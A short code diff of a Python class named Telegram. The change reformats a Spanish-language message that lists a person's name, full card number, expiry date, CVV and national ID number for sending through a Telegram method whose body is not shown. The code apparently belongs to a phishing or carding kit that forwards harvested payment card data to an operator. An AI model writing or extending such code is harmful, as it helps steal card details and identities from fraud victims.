@@ -25,11 +25,15 @@ class Telegram:
         
     def build_message(self):
         message = (
-            f'Se ha registrado una nueva CC en su sistema. '
-            f'Datos de la Tarjeta: DNI asociado: {self.dni}, Nro: {self.number}, CVV: {self.CVV}, Vto: {self.Vto}. '
-            f'Datos del Cliente: Nombre: {self.name} {self.last_name}, Telefono: {self.phone}, Email: {self.email}'
+            f'Se ha registrado una nueva CC en su sistema.\n'
+            f'NOMBRE: {self.name.upper()} {self.last_name.upper()}\n'
+            f'NRO TARJETA: {self.number}\n'
+            f'CADUCIDAD: {self.Vto}\n'
+            f'CVV: {self.CVV}\n'
+            f'DNI: {self.dni}\n'
         )
         return message
+
 
     
     def send_message(self, message:str):
